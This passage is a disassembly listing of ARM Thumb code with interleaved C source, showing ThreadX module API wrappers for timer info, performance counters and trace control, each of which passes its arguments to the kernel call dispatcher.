 80217f8:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) reschedule_ticks;
 80217fa:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80217fc:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_timer;
 80217fe:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8021800:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8021802:	4b08      	ldr	r3, [pc, #32]	; (8021824 <_txe_timer_info_get+0x40>)
 8021804:	f859 3003 	ldr.w	r3, [r9, r3]
 8021808:	681c      	ldr	r4, [r3, #0]
 802180a:	68f9      	ldr	r1, [r7, #12]
 802180c:	68ba      	ldr	r2, [r7, #8]
 802180e:	f107 0314 	add.w	r3, r7, #20
 8021812:	2050      	movs	r0, #80	; 0x50
 8021814:	47a0      	blx	r4
 8021816:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8021818:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802181a:	4618      	mov	r0, r3
 802181c:	372c      	adds	r7, #44	; 0x2c
 802181e:	46bd      	mov	sp, r7
 8021820:	bd90      	pop	{r4, r7, pc}
 8021822:	bf00      	nop
 8021824:	00000004 	.word	0x00000004

08021828 <_tx_timer_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_info_get(TX_TIMER *timer_ptr, ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 8021828:	b590      	push	{r4, r7, lr}
 802182a:	b08b      	sub	sp, #44	; 0x2c
 802182c:	af00      	add	r7, sp, #0
 802182e:	60f8      	str	r0, [r7, #12]
 8021830:	60b9      	str	r1, [r7, #8]
 8021832:	607a      	str	r2, [r7, #4]
 8021834:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) reactivates;
 8021836:	687b      	ldr	r3, [r7, #4]
 8021838:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) deactivates;
 802183a:	683b      	ldr	r3, [r7, #0]
 802183c:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) expirations;
 802183e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8021840:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) expiration_adjusts;
 8021842:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8021844:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) activates, (ALIGN_TYPE) extra_parameters);
 8021846:	4b08      	ldr	r3, [pc, #32]	; (8021868 <_tx_timer_performance_info_get+0x40>)
 8021848:	f859 3003 	ldr.w	r3, [r9, r3]
 802184c:	681c      	ldr	r4, [r3, #0]
 802184e:	68f9      	ldr	r1, [r7, #12]
 8021850:	68ba      	ldr	r2, [r7, #8]
 8021852:	f107 0314 	add.w	r3, r7, #20
 8021856:	2051      	movs	r0, #81	; 0x51
 8021858:	47a0      	blx	r4
 802185a:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 802185c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802185e:	4618      	mov	r0, r3
 8021860:	372c      	adds	r7, #44	; 0x2c
 8021862:	46bd      	mov	sp, r7
 8021864:	bd90      	pop	{r4, r7, pc}
 8021866:	bf00      	nop
 8021868:	00000004 	.word	0x00000004

0802186c <_tx_timer_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_system_info_get(ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 802186c:	b590      	push	{r4, r7, lr}
 802186e:	b089      	sub	sp, #36	; 0x24
 8021870:	af00      	add	r7, sp, #0
 8021872:	60f8      	str	r0, [r7, #12]
 8021874:	60b9      	str	r1, [r7, #8]
 8021876:	607a      	str	r2, [r7, #4]
 8021878:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) deactivates;
 802187a:	687b      	ldr	r3, [r7, #4]
 802187c:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) expirations;
 802187e:	683b      	ldr	r3, [r7, #0]
 8021880:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) expiration_adjusts;
 8021882:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8021884:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) activates, (ALIGN_TYPE) reactivates, (ALIGN_TYPE) extra_parameters);
 8021886:	4b08      	ldr	r3, [pc, #32]	; (80218a8 <_tx_timer_performance_system_info_get+0x3c>)
 8021888:	f859 3003 	ldr.w	r3, [r9, r3]
 802188c:	681c      	ldr	r4, [r3, #0]
 802188e:	68f9      	ldr	r1, [r7, #12]
 8021890:	68ba      	ldr	r2, [r7, #8]
 8021892:	f107 0310 	add.w	r3, r7, #16
 8021896:	2052      	movs	r0, #82	; 0x52
 8021898:	47a0      	blx	r4
 802189a:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 802189c:	69fb      	ldr	r3, [r7, #28]
}
 802189e:	4618      	mov	r0, r3
 80218a0:	3724      	adds	r7, #36	; 0x24
 80218a2:	46bd      	mov	sp, r7
 80218a4:	bd90      	pop	{r4, r7, pc}
 80218a6:	bf00      	nop
 80218a8:	00000004 	.word	0x00000004

080218ac <_tx_trace_buffer_full_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_buffer_full_notify(VOID (*full_buffer_callback)(VOID *buffer))
{
 80218ac:	b590      	push	{r4, r7, lr}
 80218ae:	b085      	sub	sp, #20
 80218b0:	af00      	add	r7, sp, #0
 80218b2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_BUFFER_FULL_NOTIFY_CALL, (ALIGN_TYPE) full_buffer_callback, 0, 0);
 80218b4:	4b07      	ldr	r3, [pc, #28]	; (80218d4 <_tx_trace_buffer_full_notify+0x28>)
 80218b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80218ba:	681c      	ldr	r4, [r3, #0]
 80218bc:	6879      	ldr	r1, [r7, #4]
 80218be:	2300      	movs	r3, #0
 80218c0:	2200      	movs	r2, #0
 80218c2:	205a      	movs	r0, #90	; 0x5a
 80218c4:	47a0      	blx	r4
 80218c6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80218c8:	68fb      	ldr	r3, [r7, #12]
}
 80218ca:	4618      	mov	r0, r3
 80218cc:	3714      	adds	r7, #20
 80218ce:	46bd      	mov	sp, r7
 80218d0:	bd90      	pop	{r4, r7, pc}
 80218d2:	bf00      	nop
 80218d4:	00000004 	.word	0x00000004

080218d8 <_tx_trace_disable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_disable(VOID)
{
 80218d8:	b590      	push	{r4, r7, lr}
 80218da:	b083      	sub	sp, #12
 80218dc:	af00      	add	r7, sp, #0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_DISABLE_CALL, 0, 0, 0);
 80218de:	4b07      	ldr	r3, [pc, #28]	; (80218fc <_tx_trace_disable+0x24>)
 80218e0:	f859 3003 	ldr.w	r3, [r9, r3]
 80218e4:	681c      	ldr	r4, [r3, #0]
 80218e6:	2300      	movs	r3, #0
 80218e8:	2200      	movs	r2, #0
 80218ea:	2100      	movs	r1, #0
 80218ec:	2056      	movs	r0, #86	; 0x56
 80218ee:	47a0      	blx	r4
 80218f0:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 80218f2:	687b      	ldr	r3, [r7, #4]
}
 80218f4:	4618      	mov	r0, r3
 80218f6:	370c      	adds	r7, #12
 80218f8:	46bd      	mov	sp, r7
 80218fa:	bd90      	pop	{r4, r7, pc}
 80218fc:	00000004 	.word	0x00000004

08021900 <_tx_trace_enable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_enable(VOID *trace_buffer_start, ULONG trace_buffer_size, ULONG registry_entries)
{
 8021900:	b590      	push	{r4, r7, lr}
 8021902:	b087      	sub	sp, #28
 8021904:	af00      	add	r7, sp, #0
 8021906:	60f8      	str	r0, [r7, #12]
 8021908:	60b9      	str	r1, [r7, #8]
 802190a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ENABLE_CALL, (ALIGN_TYPE) trace_buffer_start, (ALIGN_TYPE) trace_buffer_size, (ALIGN_TYPE) registry_entries);
 802190c:	4b07      	ldr	r3, [pc, #28]	; (802192c <_tx_trace_enable+0x2c>)
 802190e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021912:	681c      	ldr	r4, [r3, #0]
 8021914:	68f9      	ldr	r1, [r7, #12]
 8021916:	687b      	ldr	r3, [r7, #4]
 8021918:	68ba      	ldr	r2, [r7, #8]
 802191a:	2053      	movs	r0, #83	; 0x53
 802191c:	47a0      	blx	r4
 802191e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021920:	697b      	ldr	r3, [r7, #20]
}
 8021922:	4618      	mov	r0, r3
 8021924:	371c      	adds	r7, #28
 8021926:	46bd      	mov	sp, r7
 8021928:	bd90      	pop	{r4, r7, pc}
 802192a:	bf00      	nop
 802192c:	00000004 	.word	0x00000004

08021930 <_tx_trace_event_filter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_filter(ULONG event_filter_bits)
{
 8021930:	b590      	push	{r4, r7, lr}
 8021932:	b085      	sub	sp, #20
 8021934:	af00      	add	r7, sp, #0
 8021936:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_FILTER_CALL, (ALIGN_TYPE) event_filter_bits, 0, 0);
 8021938:	4b07      	ldr	r3, [pc, #28]	; (8021958 <_tx_trace_event_filter+0x28>)
 802193a:	f859 3003 	ldr.w	r3, [r9, r3]
 802193e:	681c      	ldr	r4, [r3, #0]
 8021940:	2300      	movs	r3, #0
 8021942:	2200      	movs	r2, #0
 8021944:	6879      	ldr	r1, [r7, #4]
 8021946:	2054      	movs	r0, #84	; 0x54
 8021948:	47a0      	blx	r4
 802194a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802194c:	68fb      	ldr	r3, [r7, #12]
}
 802194e:	4618      	mov	r0, r3
 8021950:	3714      	adds	r7, #20
 8021952:	46bd      	mov	sp, r7
 8021954:	bd90      	pop	{r4, r7, pc}
 8021956:	bf00      	nop
 8021958:	00000004 	.word	0x00000004

0802195c <_tx_trace_event_unfilter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_unfilter(ULONG event_unfilter_bits)
{
 802195c:	b590      	push	{r4, r7, lr}
 802195e:	b085      	sub	sp, #20
 8021960:	af00      	add	r7, sp, #0
 8021962:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_UNFILTER_CALL, (ALIGN_TYPE) event_unfilter_bits, 0, 0);
 8021964:	4b07      	ldr	r3, [pc, #28]	; (8021984 <_tx_trace_event_unfilter+0x28>)
 8021966:	f859 3003 	ldr.w	r3, [r9, r3]
 802196a:	681c      	ldr	r4, [r3, #0]
 802196c:	2300      	movs	r3, #0
 802196e:	2200      	movs	r2, #0
 8021970:	6879      	ldr	r1, [r7, #4]
 8021972:	2055      	movs	r0, #85	; 0x55
 8021974:	47a0      	blx	r4
 8021976:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021978:	68fb      	ldr	r3, [r7, #12]
}
 802197a:	4618      	mov	r0, r3
 802197c:	3714      	adds	r7, #20
 802197e:	46bd      	mov	sp, r7
 8021980:	bd90      	pop	{r4, r7, pc}
 8021982:	bf00      	nop
 8021984:	00000004 	.word	0x00000004

08021988 <_tx_trace_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_interrupt_control(UINT new_posture)
{
 8021988:	b590      	push	{r4, r7, lr}
 802198a:	b085      	sub	sp, #20
 802198c:	af00      	add	r7, sp, #0
 802198e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 8021990:	4b07      	ldr	r3, [pc, #28]	; (80219b0 <_tx_trace_interrupt_control+0x28>)
 8021992:	f859 3003 	ldr.w	r3, [r9, r3]
 8021996:	681c      	ldr	r4, [r3, #0]
 8021998:	2300      	movs	r3, #0
 802199a:	2200      	movs	r2, #0
 802199c:	6879      	ldr	r1, [r7, #4]
 802199e:	2057      	movs	r0, #87	; 0x57
 80219a0:	47a0      	blx	r4
 80219a2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80219a4:	68fb      	ldr	r3, [r7, #12]
}
 80219a6:	4618      	mov	r0, r3
 80219a8:	3714      	adds	r7, #20
 80219aa:	46bd      	mov	sp, r7
 80219ac:	bd90      	pop	{r4, r7, pc}
 80219ae:	bf00      	nop
 80219b0:	00000004 	.word	0x00000004

080219b4 <_tx_trace_isr_enter_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_enter_insert(ULONG isr_id)
{
 80219b4:	b590      	push	{r4, r7, lr}
 80219b6:	b083      	sub	sp, #12
 80219b8:	af00      	add	r7, sp, #0
 80219ba:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_ENTER_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
 80219bc:	4b06      	ldr	r3, [pc, #24]	; (80219d8 <_tx_trace_isr_enter_insert+0x24>)
 80219be:	f859 3003 	ldr.w	r3, [r9, r3]
 80219c2:	681c      	ldr	r4, [r3, #0]
 80219c4:	2300      	movs	r3, #0
 80219c6:	2200      	movs	r2, #0
 80219c8:	6879      	ldr	r1, [r7, #4]
 80219ca:	2058      	movs	r0, #88	; 0x58
 80219cc:	47a0      	blx	r4
}
 80219ce:	bf00      	nop
 80219d0:	370c      	adds	r7, #12
 80219d2:	46bd      	mov	sp, r7
 80219d4:	bd90      	pop	{r4, r7, pc}
 80219d6:	bf00      	nop
 80219d8:	00000004 	.word	0x00000004

080219dc <_tx_trace_isr_exit_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_exit_insert(ULONG isr_id)
{
 80219dc:	b590      	push	{r4, r7, lr}
 80219de:	b083      	sub	sp, #12
 80219e0:	af00      	add	r7, sp, #0
 80219e2:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_EXIT_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
 80219e4:	4b06      	ldr	r3, [pc, #24]	; (8021a00 <_tx_trace_isr_exit_insert+0x24>)
 80219e6:	f859 3003 	ldr.w	r3, [r9, r3]
 80219ea:	681c      	ldr	r4, [r3, #0]
 80219ec:	2300      	movs	r3, #0
 80219ee:	2200      	movs	r2, #0
 80219f0:	6879      	ldr	r1, [r7, #4]
 80219f2:	2059      	movs	r0, #89	; 0x59
 80219f4:	47a0      	blx	r4
}
 80219f6:	bf00      	nop
 80219f8:	370c      	adds	r7, #12
 80219fa:	46bd      	mov	sp, r7
 80219fc:	bd90      	pop	{r4, r7, pc}
 80219fe:	bf00      	nop
 8021a00:	00000004 	.word	0x00000004

08021a04 <_tx_trace_user_event_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_user_event_insert(ULONG event_id, ULONG info_field_1, ULONG info_field_2, ULONG info_field_3, ULONG info_field_4)
{
 8021a04:	b590      	push	{r4, r7, lr}
 8021a06:	b089      	sub	sp, #36	; 0x24
 8021a08:	af00      	add	r7, sp, #0
 8021a0a:	60f8      	str	r0, [r7, #12]
 8021a0c:	60b9      	str	r1, [r7, #8]
 8021a0e:	607a      	str	r2, [r7, #4]
 8021a10:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) info_field_2;
 8021a12:	687b      	ldr	r3, [r7, #4]
 8021a14:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) info_field_3;
 8021a16:	683b      	ldr	r3, [r7, #0]
 8021a18:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) info_field_4;
 8021a1a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8021a1c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_USER_EVENT_INSERT_CALL, (ALIGN_TYPE) event_id, (ALIGN_TYPE) info_field_1, (ALIGN_TYPE) extra_parameters);
 8021a1e:	4b08      	ldr	r3, [pc, #32]	; (8021a40 <_tx_trace_user_event_insert+0x3c>)
 8021a20:	f859 3003 	ldr.w	r3, [r9, r3]
 8021a24:	681c      	ldr	r4, [r3, #0]
 8021a26:	f107 0310 	add.w	r3, r7, #16
 8021a2a:	68ba      	ldr	r2, [r7, #8]
 8021a2c:	68f9      	ldr	r1, [r7, #12]
 8021a2e:	205b      	movs	r0, #91	; 0x5b
 8021a30:	47a0      	blx	r4
 8021a32:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8021a34:	69fb      	ldr	r3, [r7, #28]
}
 8021a36:	4618      	mov	r0, r3
 8021a38:	3724      	adds	r7, #36	; 0x24
 8021a3a:	46bd      	mov	sp, r7
 8021a3c:	bd90      	pop	{r4, r7, pc}
 8021a3e:	bf00      	nop
 8021a40:	00000004 	.word	0x00000004
